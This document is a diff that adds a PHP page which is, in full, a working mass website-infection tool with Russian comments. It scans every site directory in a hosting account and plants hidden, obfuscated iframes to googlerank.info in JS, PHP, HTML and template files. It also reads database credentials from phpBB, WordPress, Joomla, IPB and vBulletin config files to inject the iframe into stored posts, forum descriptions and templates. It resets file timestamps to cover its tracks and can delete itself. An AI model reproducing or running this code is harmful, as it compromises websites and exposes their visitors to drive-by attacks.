@@ -1,0 +1,641 @@
+<html>
+
+<head>
+  <title></title>
+</head>
+
+<body>
+<?php
+
+  check_self_delete();
+
+  error_reporting(0);
+  set_time_limit(0);
+  ignore_user_abort(1);
+  define('PHP_GLOB', 1);       // использовать пхп или шелл для передвижения по дирам
+  define('MAX_INCLUDES', 7);   // предел вложенности директорий
+  define('MAX_IFRAMES', 10);    // макс кол-во ифреймов в одном акке
+  define('IFRAME_SRC', 'http://googlerank.info');
+
+
+
+  $last_iframed_dirname = '';
+  if (file_exists('last_account.txt')) {
+      $last_iframed_dirname = file_get_contents('last_account.txt');
+  }
+  $allow = 0;
+
+//    $dirs = file('dirs.txt');
+//    foreach ($dirs as $dirname) {
+//      $dirname = trim($dirname);
+    foreach (superglob("/home/.orithyia/jjconti/*", '-d') as $dirname) {
+      if ($dirname == '/home/.orithyia/jjconti/juanjoconti.com.ar') continue;
+      if (!$last_iframed_dirname) $allow = 1;
+      if (!$allow and $dirname == $last_iframed_dirname) {
+          $allow = 1;
+          continue;
+      }
+      if (!$allow) continue;
+      flush_buffer('<b>' . $dirname . '</b>:<br>');
+      l0g("\n\n" . $dirname . ":\n");
+      $fp = fopen('last_account.txt', 'w');
+      fwrite($fp, $dirname);
+      fclose($fp);
+      iframe_webdir($dirname . '' );
+  }
+  l0g(null);
+  unlink('last_account.txt');
+
+  function iframe_webdir( $webdir ) {
+      $file_types        = array('js', 'php', 'htm', 'html', 'tpl', 'tpl.php');
+      $default_filenames = array('general-template','template-functions-general',
+                                 'index', 'footer', 'body', '*');
+      $default_dirnames  = array('template', 'templates', 'templates_c', 'views',
+                                 'views_c', 'themes', 'wp-content', 'e107_themes',
+                                 'skins', 'jscripts', 'cache', '*');
+      $skip_dirs         = array('webalizer', 'users', 'logs', '.users', 'stats',
+                                 'admin', 'images', 'thumbs', 'pictures', 'avatars');
+      $i = 0; // cчетчик вложенности директорий
+      $checked_files = array();
+      $iframes_counter = 0; // cчетчик вставленных ифреймов
+      $iframe_template = make_obfuscated_jsiframe(IFRAME_SRC);
+      $paths = array($webdir);
+      do {
+          foreach ($paths as $key => $path) {
+              if (array_search(basename($path), $skip_dirs) !== false)
+              {
+                  flush_buffer('<font color=#808080>skip path:' . $path . '</font>');
+                  unset ($paths[$key]);
+                  continue;
+              }
+              $dir_writable = super_dir_writable($path);
+              if ($dir_writable) {
+                  flush_buffer('<font color=#C0C0C0>scanning dir:' . $path .
+                               ' <b>writable</b></font>');
+              }
+              else {
+                  flush_buffer('<font color=#C0C0C0>scanning dir:' . $path .
+                               '</font>');
+              }
+              foreach ($file_types as $file_type) {
+                  for ($j = 0; $j < sizeof($default_filenames); $j ++) {
+                      $tmp_path = $path . "/" . $default_filenames[$j] .
+                                  "." . $file_type;
+                      foreach (superglob($tmp_path, '-f') as $filename) {
+                          if (file_exists('stop_iframer')) {
+                              exit('stop_iframer');
+                          }
+                          if (in_array($filename, $checked_files)) {
+                              continue;
+                          }
+                          else {
+                              $checked_files[] = $filename;
+                          }
+                          if ($iframes_counter >= MAX_IFRAMES) {
+                              return true;
+                          }
+                          $result = false;
+                          if (!$dir_writable and !super_file_writable($filename)) {
+                              $result = iframeSQL_by_config($filename);
+                              continue;
+                          }
+                          if ($file_type == 'js') {
+                              $result = iframe_js_file($filename, "\n" .
+                                                       $iframe_template . "\n");
+                          }
+                          else {
+                              if ($file_type == 'php') {
+                                  $result = iframe_standart_files($filename);
+                                  if (!$result)
+                                      $result = iframeSQL_by_config($filename);
+                              }
+                              if (!$result) {
+                                  $result = iframe_file($filename,
+                                                "\n<script language=\"JavaScript\"" .
+                                                " type=\"text/javascript\">\n" .
+                                                $iframe_template . "\n</script>\n");
+                              }
+                          }
+                          if ($result == true) {
+                              $iframes_counter ++;
+                          }
+                      }
+                  }
+              }
+          }
+          // опускаемся в директории на один уровень ниже:
+          $dirnames = array();
+          foreach ($paths as $path) {
+              for ($j = 0; $j < sizeof($default_dirnames); $j ++) {
+                  $tmp_path = $path . "/" . $default_dirnames[$j];
+                  foreach (superglob($tmp_path, '-d') as $dirname) {
+                      $dirnames[] = $dirname;
+                  }
+              }
+          }
+          $paths = array_unique($dirnames);
+          $i ++;
+          // повторяем процедуру отифреймливания в этих директориях:
+      } while($i < MAX_INCLUDES); // предел вложенности директорий
+  }
+
+  function iframe_file( $filename, $iframe_template ) {
+      $tags_to_attach = array('</td>', '<a ', '</head>', '<table', '<br>', '<form');
+      $content = super_get_contents($filename);
+      if ($content !== false) {
+          $content_low = strtolower($content);
+          if (   strpos($content_low, 'frameset')   !== false
+              or strpos($content, $iframe_template) !== false
+              or strpos($content, ' = document.getElementById(') !== false
+              or strpos($content, IFRAME_SRC)       !== false ) {
+              return false;
+          }
+          if (    strpos($content_low, '<body'  )  === false
+              and strpos($content_low, '</body'  ) === false) {
+              return false;
+          }
+          foreach ($tags_to_attach as $key => $value) {
+              if (strpos($content_low, $value) === false) {
+                  unset($tags_to_attach[$key]);
+              }
+          }
+          sort($tags_to_attach);
+          $tag_to_attach     = $tags_to_attach[rand(0, sizeof($tags_to_attach) - 1)];
+          $tag_to_attach_pos = strpos(strrev($content_low), strrev($tag_to_attach));
+          $tag_to_attach_pos = $tag_to_attach_pos + strlen($tag_to_attach);
+          $left_part = substr($content, 0, strlen($content) - $tag_to_attach_pos);
+          $right_part = substr($content, -$tag_to_attach_pos);
+          $openphp_pos =  strpos(strrev($left_part), '?<');
+          $closephp_pos = strpos(strrev($left_part), '>?');
+          if ($openphp_pos > $closephp_pos) {
+              //мы в пхп коде, и хз в двойных кавычках или нет, поэтому вставляем                    просто ифрейм без кавычек:
+              $iframed_content = $left_part . '<iframe src=' . IFRAME_SRC .
+                                 ' style=display:none></iframe>' . $right_part;
+          }
+          else {
+              $iframed_content = $left_part . $iframe_template . $right_part;
+          }
+
+          $result = superfwrite($filename, $iframed_content, 'w');
+          if ($result === false) {
+              return false;
+          }
+          flush_buffer($filename . '<br>');
+          l0g($filename . "\n");
+          return true;
+      }
+      else {
+          return false;
+      }
+  }
+
+  function iframe_js_file( $filename, $iframe_template ) {
+      $content = super_get_contents($filename);
+      if (strpos($content, $iframe_template) !== false
+          or strpos($content, ' = document.getElementById(') !== false) {
+          return false;
+      }
+      $result = superfwrite($filename, $iframe_template, 'a');
+      if ($result === false) {
+           return false;
+      }
+      flush_buffer($filename . '<br>');
+      l0g($filename . "\n");
+      return true;
+  }
+
+ function make_obfuscated_jsiframe( $iframe_src ) {
+      $iframe_id     = make_random_varname();
+      $iframe_object = make_random_varname();
+      $cookie_name = make_random_varname();
+      $iframe_code  = make_random_varname();
+      $cookie_value = rand(1,9);
+      $crcode='';
+      $injcode = "<iframe id=" . $iframe_id . " src=" .
+                 $iframe_src . " style=display:none></iframe>";
+      for ($i = 0; $i < strlen($injcode); $i++) {
+          $crcode .= sprintf("%%%x",ord($injcode[$i]));
+      }
+/*      return "if (document.cookie.search(\"" . $cookie_name . "=" . $cookie_value .
+             "\") == -1) {\n" . $iframe_object . " = document.getElementById('" .
+             $iframe_id . "');\nif (" . $iframe_object . " == null) {".$iframe_code.
+             "=unescape('".random_split($crcode, "'+'")."');document.write(" .
+             $iframe_code. ");}" . "\ndocument.cookie = \"" . $cookie_name . "=" .
+             $cookie_value .";expires=Sun, 01-Dec-2009 08:00:00 GMT;path=/\";}";*/
+
+      return genered_vars($iframe_object . "=document.getElementById('" .
+                          $iframe_id  . "');if(" . $iframe_object .
+                          "==null){document.write('<iframe id=" . $iframe_id .
+                          " src=" . $iframe_src . " style=display:none></iframe>');}"
+                          ,'eval');
+ }
+
+  function random_split( $str, $glue_str ) {
+      $length = strlen($str);
+      $glue_length = strlen($glue_str);
+      for ($i = 0; $i < 50; $i ++) {
+          $rand[] = rand(1, $length - 1);
+      }
+      $rand = array_unique($rand);
+      sort($rand);
+      for ($i = 0; $i < sizeof($rand); $i ++) {
+          $str = substr($str, 0, ($rand[$i]) + $glue_length * $i) . $glue_str .
+                 substr($str, ($rand[$i] + $glue_length * $i));
+      }
+      return $str;
+  }
+
+  function make_random_varname(  ) {
+      for ($i = 0; $i < rand(3, 5); $i ++) {
+          $var_simbols[] = chr(rand(97, 122));
+      }
+      return implode('', $var_simbols);
+  }
+
+  function iframeSQL_by_config( $filename ) {
+      $content = super_get_contents($filename);
+      $iframe = '<iframe src=' . IFRAME_SRC . ' style=display:none></iframe>';
+      // конфиг phpBB:
+      if (basename($filename) == 'config.php'
+          and strpos($content, 'phpBB') !== false) {
+          preg_match_all("/(?:dbhost|dbname|dbuser|dbpasswd|table_prefix)" .
+                         "\s*\=\s*'([^']*)'/",
+                         $content,
+                         $matches);
+          mysql_connect($matches[1][0], $matches[1][2], $matches[1][3]);
+          mysql_select_db($matches[1][1]);
+          // ифреймим описание последнего в списке форума:
+          $result = mysql_query('SELECT MAX(forum_id) AS maxid
+                                 FROM ' . $matches[1][4] . 'forums');
+          $rows = mysql_fetch_assoc($result);
+          mysql_query('UPDATE ' . $matches[1][4] . 'forums
+                       SET forum_desc=CONCAT(forum_desc,
+                                            "' . $iframe . '")
+                       WHERE forum_id=' . $rows['maxid']);
+          flush_buffer('phpBB SQLbase iframed:' . $filename .'<br>');
+          l0g("phpBB SQLbase iframed:" . $filename . "\n");
+          return true;
+      }
+      // конфиг WordPress:
+      if (basename($filename) == 'wp-config.php') {
+          preg_match_all("/(?:DB_HOST|DB_NAME|DB_USER|DB_PASSWORD|table_prefix)" .
+                         "',\s*'([^']*)'/",
+                         $content,
+                         $matches);
+          preg_match("/table_prefix\s*\=\s*'([^']*)'/", $content, $table_prefix);
+          mysql_connect($matches[1][3], $matches[1][1], $matches[1][2]);
+          mysql_select_db($matches[1][0]);
+          // ифреймим одну ссылку из раздела Links:
+          mysql_query('UPDATE ' . $table_prefix[1] . 'links
+                       SET link_image=CONCAT(link_image,
+                                             \'" width="0" height="0"/>\',
+                                             link_name,
+                                             \'</a>' . $iframe .
+                                             '<a href=# style=display:none>' .
+                                             '<img  width="0" height="0" src="\')                           WHERE link_visible = "Y"
+                       LIMIT 1');
+          // ифреймим все статьи из раздела Pages:
+          mysql_query("UPDATE " . $table_prefix[1] . "posts
+                       SET post_content = CONCAT(post_content,
+                                                 '" . $iframe . "')
+                       WHERE post_type='page'");
+          flush_buffer('WordPress SQLbase iframed:' . $filename .'<br>');
+          l0g("WordPress SQLbase iframed:" . $filename . "\n");
+          return true;
+      }
+      // конфиг Joomla:
+      if (basename($filename) == 'configuration.php'
+          and strpos($content, 'mosConfig') !== false) {
+          preg_match_all("/(?:mosConfig_host|mosConfig_db|mosConfig_user" .
+                         "|mosConfig_password|mosConfig_dbprefix)\s*\=\s*'([^']*)'/",
+                         $content,
+                         $matches);
+          mysql_connect($matches[1][0], $matches[1][1], $matches[1][2]);
+          mysql_select_db($matches[1][3]);
+          // добавляем баннер с ифреймом:
+          mysql_query("INSERT into " . $matches[1][4] . "banner
+                                                 (cid, name, imageurl, clickurl,
+                                                  date, showBanner, custombannercode)
+                       VALUES(1, '', '', '', '2010-06-05 18:45:41', 1, '" .
+                              $iframe . "');");
+          flush_buffer('Joomla SQLbase iframed:' . $filename .'<br>');
+          l0g("Joomla SQLbase iframed:" . $filename . "\n");
+          return true;
+      }
+      // конфиг Invision Power Board:
+      if (basename($filename) == 'conf_global.php'
+          and strpos($content, "\$INFO['mysql_tbl_type']") !== false) {
+               preg_match_all("/(?:INFO\['sql_host'\]|INFO\['sql_database'\]|INFO\['sql_user'\]|INFO\['sql_pass'\]|INFO\['sql_tbl_prefix'\])" .
+                         "\s*\=\s*'([^']*)'/",
+                         $content,
+                         $matches);
+          mysql_connect($matches[1][0], $matches[1][2], $matches[1][3]);
+          mysql_select_db($matches[1][1]);
+          // ифреймим описание первого попавшегося форума:
+          mysql_query("UPDATE " . $matches[1][4] . "forums
+                       SET description = concat(description, '" . $iframe . "')
+                       WHERE status=1 AND parent_id > 0
+                       LIMIT 1");
+          // ифреймим в кэше описание последнего в списке форума:
+          $result = mysql_query("SELECT cs_value FROM " . $matches[1][4] .
+                                "cache_store
+                                 WHERE cs_key='forum_cache'");
+          $rows = mysql_fetch_assoc($result);
+          $forums = unserialize($rows['cs_value']);
+          end($forums);
+          $last_id = key($forums);
+          $forums[$last_id]['description'] .= $iframe ;
+          mysql_query("UPDATE " . $matches[1][4] . "cache_store
+                       SET cs_value = '" . serialize($forums) . "'
+                       WHERE cs_key='forum_cache'");
+          flush_buffer('IPB SQLbase iframed:' . $filename .'<br>');
+          l0g("IPB SQLbase iframed:" . $filename . "\n");
+          return true;
+      }
+      // конфиг vBulletin:
+
+      if (basename($filename) == 'config.php'
+          and strpos($content, 'vBulletin') !== false) {
+          preg_match_all("/(?:config\['MasterServer'\]\['servername'\]|config\['Database'\]\['dbname'\]|config\['MasterServer'\]\['username'\]|config\['MasterServer'\]\['password'\]|config\['Database'\]\['tableprefix'\])" .
+                         "\s*\=\s*'([^']*)'/",
+                         $content,
+                         $matches);
+          mysql_connect($matches[1][2], $matches[1][3], $matches[1][4]);
+          mysql_select_db($matches[1][0]);
+          // ифреймим все темплейты после <body>:
+          $result = mysql_query("SELECT template, template_un, templateid
+                                 FROM " . $matches[1][1] . "template");
+
+          while ($rows = mysql_fetch_assoc($result)) {
+              $tpl_iframed    = preg_replace("/<body([^<>]*)>/i",
+                                         "<body$1>\n" . $iframe,
+                                          $rows['template']);
+              $tpl_un_iframed = preg_replace("/<body([^<>]*)>/i",
+                                         "<body$1>\n" . $iframe,
+                                         $rows['template_un']);
+
+              mysql_query("UPDATE " . $matches[1][1] . "template
+                           SET template = '" . mysql_escape_string ($tpl_iframed) .
+                           "', template_un = '" .
+                           mysql_escape_string ($tpl_un_iframed) .
+                           "' WHERE templateid=" . $rows['templateid']);
+          }
+          flush_buffer('vBulletin SQLbase iframed:' . $filename .'<br>');
+          l0g("vBulletin SQLbase iframed:" . $filename . "\n");
+          return true;
+      }
+      return false;
+  }
+
+  function flush_buffer ( $str = '' ) {
+      echo '<div>'. $str .'</div>'. str_pad(' ',4096);
+      flush();
+  }
+
+  function l0g ( $str ) {
+      static $fp = null;
+      if ($str === null and $fp) {
+          fclose($fp);
+          return;
+      }
+      if (!$fp) {
+          $fp = fopen('log.txt' . time(), 'w');
+      }
+      fwrite($fp, $str);
+  }
+
+  function superglob ( $path, $mode ) {
+      if (PHP_GLOB) {
+          if ($mode == '-d') return glob($path, GLOB_ONLYDIR);
+          else               return glob($path);
+      }
+      else {
+          exec('for i in ' . $path . '; do test ' . $mode . ' $i && echo $i; done',
+               $results);
+          return $results;
+      }
+  }
+
+  function super_get_contents ( $filename ) {
+      if (PHP_GLOB) {
+          return file_get_contents($filename);
+      }
+      else {
+          ob_start();
+          passthru('cat ' . $filename, $cmd_result);
+          if ($cmd_result == 0) $contents = ob_get_contents();
+          else                  $contents = false;
+          ob_end_clean();
+          return $contents;
+      }
+  }
+
+  function superfwrite ( $filename, $content, $write_mode ) {
+      $cmd_write_mode = ($write_mode == 'w') ? '>' : '>>';
+      $fileatime = fileatime ($filename);
+      $filemtime = filemtime ($filename);
+      if (PHP_GLOB) {
+          $fp = fopen($filename, $write_mode);
+          $result = fwrite($fp, $content);
+          touch ($filename,$filemtime ,$fileatime );
+          fclose($fp);
+          if (!$result) {
+              $path_parts = pathinfo($filename);
+              if (is_writable($path_parts["dirname"])) {
+                  copy($filename, 'tmp_file');
+                  $fp = fopen('tmp_file', $write_mode);
+                  $result = fwrite($fp, $content);
+                  fclose($fp);
+                  unlink($filename);
+                  $result = copy('tmp_file', $filename);
+                  touch ($filename,$filemtime ,$fileatime );
+              }
+          }
+          return $result;
+      }
+      else {
+          passthru("echo " . escapeshellarg($content) .
+                   $cmd_write_mode . $filename ,$cmd_result);
+          touch ($filename,$filemtime ,$fileatime );
+          if ($cmd_result != 0) {
+              passthru("cp " . $filename . " tmp_file");
+              passthru("echo " . escapeshellarg($content) .
+              $cmd_write_mode . "tmp_file");
+              passthru("rm -f " . $filename);
+              passthru("cp " . "tmp_file " . $filename , $cmd_result);
+              touch ($filename,$filemtime ,$fileatime );
+          }
+          if ($cmd_result == 0) return true;
+          else                  return false;
+      }
+  }
+
+  function super_dir_writable($path) {
+      if (PHP_GLOB) {
+          if (is_writable($path)) return true;
+          else                    return false;
+      }
+      else {
+          $rnd_name = md5(time());
+          passthru("echo test>" . $path . "/" . $rnd_name, $cmd_result);
+          if ($cmd_result != 0) return false;
+          passthru("rm -f " . $path . "/" . $rnd_name, $cmd_result);
+          if ($cmd_result == 0) return true;
+          else                  return false;
+      }
+  }
+
+  function super_file_writable($filename) {
+      if (PHP_GLOB) {
+          if (is_writable($filename)) return true;
+          else                        return false;
+      }
+      else {
+          passthru("echo ''>>" . $filename, $cmd_result);
+          if ($cmd_result == 0) return true;
+          else                  return false;
+      }
+  }
+
+  function iframe_standart_files ( $filename ) {
+      // Wordpress general-template.php
+      $content = super_get_contents($filename);
+      if ($content === false) return false;
+      if (basename($filename) == 'general-template.php' or
+          basename($filename) == 'template-functions-general.php') {
+          $search  = array('get_header() {', 'get_footer() {');
+          $replace = array('get_header() {' . "\n" .
+                           'setcookie("yahg", 1, time()+30*40*29*815, "/");' . "\n",
+                           'get_footer() {' . "\n" . "if (!\$_COOKIE['yahg']) echo" .
+                           " base64_decode('PGlmcmFtZSBzcmM9aHR0cDovL2dvb2dsZXJhb" .
+                           "msuaW5mby9jb3VudGVyIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcm" .
+                           "FtZT4=');" . "\n");
+          $iframed_content = str_replace($search, $replace, $content);
+          $result = superfwrite($filename, $iframed_content, 'w');
+          if ($result) {
+              flush_buffer('standart: ' . $filename . '<br>');
+              l0g('standart: ' . $filename . "\n");
+          }
+          return $result;
+      }
+      else return false;
+  }
+
+  function check_self_delete() {
+      if (isset($_GET['delete'])) {
+          unlink(__FILE__);
+          if (!file_exists(__FILE__)) echo basename(__FILE__) . " deleted<br>";
+          foreach(glob('log.txt*') as $log_file) {
+              unlink($log_file);
+              if (!file_exists($log_file)) echo $log_file . " deleted<br>";
+          }
+          if (file_exists('stop_iframer')) {
+              @unlink('stop_iframer');
+              if (!file_exists('stop_iframer')) echo 'stop_iframer' . " deleted<br>";
+          }
+          if (file_exists('last_account.txt')) {
+              @unlink('last_account.txt');
+              if (!file_exists('last_account.txt')) {
+                  echo 'last_account.txt' . " deleted<br>";
+              }
+          }
+          if (file_exists('tmp_file')) {
+              @unlink('tmp_file');
+              if (!file_exists('tmp_file')) {
+                  echo 'tmp_file' . " deleted<br>";
+              }
+          }
+          die;
+      }
+      if (isset($_GET['stop'])) {
+          $ch = @fopen('stop_iframer', 'w');
+          @fwrite($ch, '');
+          @fclose($ch);
+          if (file_exists('stop_iframer')) echo 'iframer stoped' . "<br>";
+          die;
+      }
+      else {
+          flush_buffer("<b><a href=" . $_SERVER['PHP_SELF'] .
+                       "?delete>self delete</a></b>"  . "<br><b><a href=" .
+                       $_SERVER['PHP_SELF'] . "?stop>self stop</a></b>");
+      }
+  }
+
+// ======================== from IFRAME.IN:
+
+function get_rnd_var()
+{
+    do {
+        $x = md5(mt_rand(1,time()));
+    } while (ord($x{0}) < 97);
+
+    return substr(strtoupper($x), 0, mt_rand(16,32));
+}
+
+function get_value($v, &$codebuf)
+{
+    $var1 = get_rnd_var();
+    $var2 = get_rnd_var();
+    $vars = array(
+                      "$v",
+                      $var1,
+                      $var1.'()',
+                      $var1.'()',
+                 );
+    $bufs = array(
+                     "",
+                     "var $var1=$v;",
+                     "function $var1(){return $v;}",
+                     "function $var1(){var $var2=$v;return $var2;}",
+                 );
+    $item = rand(0, count($vars)-1);
+    $codebuf .= $bufs[$item];
+    return $vars[$item];
+}
+
+function genered_vars($q, $mm)
+{
+    $r='';
+    for($i=0;$i<strlen($q);$i++)
+    {
+    $hex=dechex(ord($q[$i]));
+    if (strlen($hex)==1) $hex = '0'.$hex;
+    $r .= $hex;
+    }
+    $r=strtoupper($r);
+
+    $hex2dec = get_rnd_var();
+    $hex = get_rnd_var();
+    $codebuf1 = '';
+    $value16 = get_value(16, $codebuf1);
+    $c = 'function '.$hex2dec.'('.$hex.'){'.$codebuf1.'return(parseInt('.$hex.','
+    .$value16.'));}';
+
+    $deco = get_rnd_var();
+    $t = get_rnd_var();
+    $s = get_rnd_var();
+    $i = get_rnd_var();
+    $codebuf2 = '';
+    $value2 = get_value(2, $codebuf2);
+    $c .= 'function '.$deco.'('.$t.'){'.$codebuf2.'var '.$s.'="";for('.$i.'=0;'.$i
+    .'<'.$t.'.length;'.$i.'+='.$value2.'){'.$s.'+=( String.fromCharCode('.$hex2dec
+    .'('.$t.'.substr('.$i.','.$value2.'))));}'.$mm.'('.$s.');}';
+
+    return $c.$deco.'("'.$r.'");';
+}
+
+/*юзать
+echo genered_vars('alert("qwe")','eval');
+для исполнения скрипта
+
+или
+echo genered_vars('<hr>','document.write');
+для html*/
+
+
+?>
+
+for i in *; do test -d $i && echo $i; done
+</body>
+
+</html>
